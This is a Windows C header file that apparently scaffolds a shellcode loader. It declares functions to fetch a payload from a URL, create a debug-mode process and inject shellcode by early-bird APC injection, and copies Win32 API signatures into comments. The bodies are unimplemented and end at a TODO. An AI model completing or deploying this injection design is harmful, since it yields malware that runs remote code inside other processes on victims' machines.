#pragma once
#pragma comment(lib, "Wininet.lib")

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <wininet.h>



// =================== STAGING =================== //


BOOL GetPayloadFromUrl(LPCWSTR, PBYTE*, SIZE_T*);
/*

HINTERNET InternetOpenW(
  [in] LPCWSTR lpszAgent,
  [in] DWORD   dwAccessType,
  [in] LPCWSTR lpszProxy,
  [in] LPCWSTR lpszProxyBypass,
  [in] DWORD   dwFlags
);


HINTERNET InternetOpenUrlW(
  [in] HINTERNET hInternet,
  [in] LPCWSTR   lpszUrl,
  [in] LPCWSTR   lpszHeaders,
  [in] DWORD     dwHeadersLength,
  [in] DWORD     dwFlags,
  [in] DWORD_PTR dwContext
);


BOOL InternetReadFile(
  [in]  HINTERNET hFile,
  [out] LPVOID    lpBuffer,
  [in]  DWORD     dwNumberOfBytesToRead,
  [out] LPDWORD   lpdwNumberOfBytesRead
);

*/



// =================== Process Creation in Debug Mode =================== //


BOOL CreateDebugProcess(LPCSTR, DWORD*, HANDLE*, HANDLE*);
/*

BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);


*/


// =================== EARLY BIRD APC Injection =================== //


BOOL InjectShellcodeToRemoteProcess(HANDLE, PBYTE, SIZE_T, PVOID);

//TODO